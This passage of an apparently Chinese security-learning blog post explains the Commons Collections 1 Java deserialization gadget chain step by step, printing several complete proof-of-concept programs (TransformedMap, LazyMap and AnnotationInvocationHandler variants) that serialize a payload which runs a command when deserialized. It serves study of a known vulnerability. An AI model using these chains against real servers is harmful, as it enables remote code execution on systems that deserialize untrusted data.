<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有参数，那就非常简单了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//得到<span class="title">Runtime</span> <span class="title">class</span></span></span><br><span class="line"><span class="class">            //由于<span class="title">InvokerTransformer</span>的构造函数要求传入<span class="title">Class</span>类型的参数类型，和<span class="title">Object</span>类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line"><span class="class">            //上面传入<span class="title">Runtime</span>.<span class="title">class</span>，调用<span class="title">Runtime</span> <span class="title">class</span>的<span class="title">getRuntime</span>方法（由于是一个静态方法，<span class="title">invoke</span>调用静态方法，传入类即可）</span></span><br><span class="line">            new InvokerTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),</span><br><span class="line">            <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>invoke的return是根据被调用的函数return啥，invoke就return啥。<br>就好比我invoke一个我自定义的方法a，在a中，我return了字符串”1”。那么就是invoke的结果就是字符串”1”。<br>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p>
</blockquote>
<p>但是！！！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line">        Class cls = input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line">        <span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>还是会陷入死胡同：</p>
<p>得到Runtime类实例才能调用exec方法。<br>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例………</p>
<h2 id="破局：反射！！！"><a href="#破局：反射！！！" class="headerlink" title="破局：反射！！！"></a>破局：反射！！！</h2><p>还是得反射去搞：</p>
<p>目前是开头不能获得<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>，只能得到<code>Class.forName(&quot;java.lang.Class&quot;)</code></p>
<p>我们的最终目的是执行<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p>
<p>这里的思路是：</p>
<ol>
<li>对于<code>Class.forName(&quot;java.lang.Class&quot;)</code>环境下，需要先把<code>getMethod</code>方法拿到。</li>
<li>再用<code>getMethod</code>方法去把获取Runtime类中的getRuntime函数反射出来，哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li>
<li>再通过反射机制获取反射机制中的invoke方法，执行上面获取的getRuntime函数</li>
<li></li>
</ol>
<p>先来获取getRuntime类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]);</span><br><span class="line"><span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure>



<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914090729438.png" alt="image-20200914090729438"></p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914092306947.png" alt="image-20200914092306947"></p>
<p>先来构造第一层：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对照着来，构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，Class[0]是用来占位的，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“/Applications/Calculator.app/Contents/MacOS/Calculator”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是这里并不是这么简单的，细节：</p>
<p>这里需要清楚的是，在第二层出来之后，需要注意的是返回的是getRuntime这个方法，是Method类型的。它会进入到下一层循环，所以没法继续invoke这里需要进行反射出来invoke方法。</p>
<p>继续构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure>

<p>以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iMethodName="invoke"</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span></span><br><span class="line"><span class="function"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span></span><br></pre></td></tr></table></figure>

<p>按照invoke中的input才是它要调用的环境的准则。<br><code>invoke方法.invoke(input, this.iArgs)</code>实际上等于<code>input.invoke(this.iArgs)</code>，<br>而input=getRuntime方法，那么只要填入<code>this.iArgs</code>就好了</p>
<p>又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br><code>this.iArgs=null,new Object[0]</code></p>
<p>那么整合就如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">    new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">    new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/20200104110053-6b91bb20-2e9e-1.jpg" alt="img"></p>
<p>一个字：妙！</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200915094410701.png" alt="image-20200915094410701"></p>
<h2 id="第五步-TransformedMap"><a href="#第五步-TransformedMap" class="headerlink" title="第五步 TransformedMap"></a>第五步 TransformedMap</h2><p>我们看一下目前的攻击流程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何提高利用度？</p>
<h3 id="分装成Map"><a href="#分装成Map" class="headerlink" title="分装成Map"></a>分装成Map</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p>
<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p>
<p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p>
<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914100613071.png" alt="image-20200914100613071"></p>
<p>try一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">    <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">    Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">    <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">    <span class="comment">//outerMap_now.put("123", "123");</span></span><br><span class="line">    <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有效的。</p>
<h2 id="lazyMap版本"><a href="#lazyMap版本" class="headerlink" title="lazyMap版本"></a>lazyMap版本</h2><p>直接上PoC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">lazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"ddddddd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也是可以的</p>
<h2 id="第六步-寻找readObject复写点"><a href="#第六步-寻找readObject复写点" class="headerlink" title="第六步 寻找readObject复写点"></a>第六步 寻找readObject复写点</h2><p>上面的PoC还是有点别扭，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p>
<p>在jdk1.7中就存在一个完美的readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。<br>看他的构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;<span class="comment">//var1满足这个if条件时</span></span><br><span class="line">        <span class="keyword">this</span>.type = var1;<span class="comment">//传入的var1到this.type</span></span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;<span class="comment">//我们的map传入this.memberValues</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>readObject复写函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//默认反序列化,这里是前半部分代码</span></span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//这里的this.type是我们在实例化的时候传入的jdk自带的Target.class</span></span><br><span class="line">            <span class="comment">//之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取我们构造map的迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//遍历map迭代器</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取key的名称</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);<span class="comment">//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();<span class="comment">//获取map的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。<br>这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。</p>
<p>最终模拟攻击代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914103156574.png" alt="image-20200914103156574"></p>
<p>至此，我们在客户端构造了payload发送至服务端，只要服务端：</p>
<ol>
<li>对我们的输入进行反序列化</li>
<li>jdk版本为1.7</li>
</ol>
<p>就可以直接完成命令执行，完美！</p>
<p>但是！！！</p>
<p><code>AnnotationType.getInstance(this.type)</code>是一个关键的有关注解的操作。所以我们需要先来了解一下java的注解。</p>
<h3 id="补充知识：注解"><a href="#补充知识：注解" class="headerlink" title="补充知识：注解"></a>补充知识：注解</h3><p><code>Target.class</code>其实是java提供的的<strong>元注解</strong>（因为是注解所以之后写成特有的形式<code>@Target</code>）。除此之外还有<code>@Retention</code>、<code>@Documented</code>、<code>@Inherited</code>，所谓<strong>元注解就是标记其他注解的注解</strong>。</p>
<ul>
<li>@Target 用来约束注解可以应用的地方（如方法、类或字段）</li>
<li>@Retention用来约束注解的生命周期，分别有三个值，源码级别（source），类文件级别（class）或者运行时级别（runtime)</li>
<li>@Documented 被修饰的注解会生成到javadoc中</li>
<li>@Inherited 可以让注解被继承，但这并不是真的继承，只是通过使用@Inherited，可以让子类Class对象使用getAnnotations()获取父类被@Inherited修饰的注解</li>
<li>除此之外注解还可以有注解元素(等同于赋值)。</li>
</ul>
<p>举个自定义注解的例子：</p>
